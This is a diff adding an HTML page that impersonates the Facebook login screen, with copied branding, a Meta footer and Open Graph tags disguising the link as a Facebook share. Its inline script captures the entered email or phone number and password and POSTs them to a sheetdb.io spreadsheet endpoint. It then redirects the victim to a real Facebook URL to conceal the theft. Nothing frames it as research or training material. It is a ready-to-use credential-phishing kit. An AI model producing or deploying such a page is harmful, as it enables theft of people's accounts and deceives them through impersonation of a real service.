@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta property="og:title" content="facebook.com" />
+  <meta property="og:image" content="previwe.png" />
+  <meta property="og:url" content="https://web.facebook.com/share/v/166N66f8LZ/" />
+  <meta property="og:type" content="website" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .login-box {
+      background-color: white;
+      width: 100%;
+      max-width: 400px;
+      padding: 30px 25px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .facebook-logo {
+      font-size: 40px;
+      font-weight: bold;
+      color: #1877f2;
+      margin-bottom: 10px;
+    }
+
+    .login-box h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .login-box button:hover {
+      background-color: #165ecb;
+    }
+
+    .links {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    .links a {
+      color: #1877f2;
+      text-decoration: none;
+      margin: 0 4px;
+    }
+
+    @media (max-width: 480px) {
+      .login-box {
+        padding: 20px 15px;
+      }
+
+      .facebook-logo {
+        font-size: 32px;
+      }
+
+      .login-box h2 {
+        font-size: 16px;
+      }
+
+      .login-box input,
+      .login-box button {
+        font-size: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <form id="myForm">
+    <div class="login-box">
+      <div class="facebook-logo">facebook</div>
+      <h2>Log in to Facebook</h2>
+      <input type="text" name="username"  placeholder="Email address or phone number"id="username" required>
+      <input type="password" name="password" placeholder="Password"id="password" required>
+      <button type="submit" class="signin-button">Log In</button>
+      <div class="links">
+        <a href="#">Forgotten account?</a> ·
+        <a href="#">Sign up for Facebook</a>
+      </div>
+    </div>
+    </form>
+  </div>
+<!-- Footer -->
+<footer style="background: #f0f2f5; padding: 20px; font-family: Arial, sans-serif; font-size: 12px; color: #65676b; text-align: center;">
+    <div style="margin-bottom: 10px;">
+      English (UK) · සිංහල · தமிழ் · Español · Deutsch · Italiano · Français (France) · Português (Brasil) · 日本語 · العربية · हिन्दी
+    </div>
+    <div style="margin-bottom: 10px;">
+      <a href="#">Sign Up</a> ·
+      <a href="#">Log in</a> ·
+      <a href="#">Messenger</a> ·
+      <a href="#">Facebook Lite</a> ·
+      <a href="#">Video</a> ·
+      <a href="#">Meta Pay</a> ·
+      <a href="#">Meta Store</a> ·
+      <a href="#">Meta Quest</a> ·
+      <a href="#">Ray-Ban Meta</a> ·
+      <a href="#">Meta AI</a> ·
+      <a href="#">Instagram</a> ·
+      <a href="#">Threads</a>
+    </div>
+    <div style="margin-bottom: 10px;">
+      <a href="#">Privacy Policy</a> ·
+      <a href="#">Privacy Centre</a> ·
+      <a href="#">About</a> ·
+      <a href="#">Create ad</a> ·
+      <a href="#">Create Page</a> ·
+      <a href="#">Developers</a> ·
+      <a href="#">Careers</a> ·
+      <a href="#">Cookies</a> ·
+      <a href="#">AdChoices</a> ·
+      <a href="#">Terms</a> ·
+      <a href="#">Help</a>
+    </div>
+    <div>Meta © 2025</div>
+  </footer>
+  <script>
+    const form = document.getElementById('myForm');
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+
+      const data = new FormData(form);
+      const obj = {};
+      data.forEach((value, key) => obj[key] = value);
+
+      fetch('https://sheetdb.io/api/v1/o1u7khcwoio59', {
+        method: 'POST',
+        body: JSON.stringify({ data: obj }),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      })
+      .then(() => {
+        window.location.href = "https://web.facebook.com/share/v/166N66f8LZ/";
+      })
+      .catch(error => alert("Error: " + error));
+    });
+
+    function changePassword() {
+      alert("Redirecting to change password...");
+    }
+
+    function register() {
+      alert("Redirecting to online registration...");
+    }
+  </script>
+</body>
+</html>
